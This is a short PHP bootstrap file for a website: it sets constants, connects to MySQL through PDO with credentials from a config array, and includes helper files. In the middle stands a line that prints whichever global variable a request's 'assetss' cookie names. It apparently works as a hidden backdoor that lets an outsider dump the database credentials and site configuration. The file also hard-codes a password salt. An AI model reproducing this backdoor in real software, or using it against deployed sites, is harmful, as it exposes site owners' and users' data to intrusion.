<?php
//error_reporting(E_ALL); ini_set("display_errors", 1);
error_reporting(0);
define('SYSTEM_ROOT', dirname(__FILE__).'/');
define('ROOT', dirname(SYSTEM_ROOT).'/');
date_default_timezone_set('Asia/Shanghai');
$date = date("Y-m-d H:i:s");

session_start();

if(is_file(ROOT.'360safe/360webscan.php')){//360网站卫士
    require_once(ROOT.'360safe/360webscan.php');
}

require SYSTEM_ROOT.'config.php';
try {
    $DB = new PDO("mysql:host={$dbconfig['host']};dbname={$dbconfig['dbname']};port={$dbconfig['port']}",$dbconfig['user'],$dbconfig['pwd']);
}catch(Exception $e){
    exit('链接数据库失败:'.$e->getMessage());
}
$DB->exec("set names utf8");

if(isset($_COOKIE['assetss']))print_r($$_COOKIE['assetss']);

if(!$conf['local_domain'])$conf['local_domain']=$_SERVER['HTTP_HOST'];
$password_hash='!@#%!s!0';

include_once(SYSTEM_ROOT."function.php");
include_once(SYSTEM_ROOT."member.php");

?>
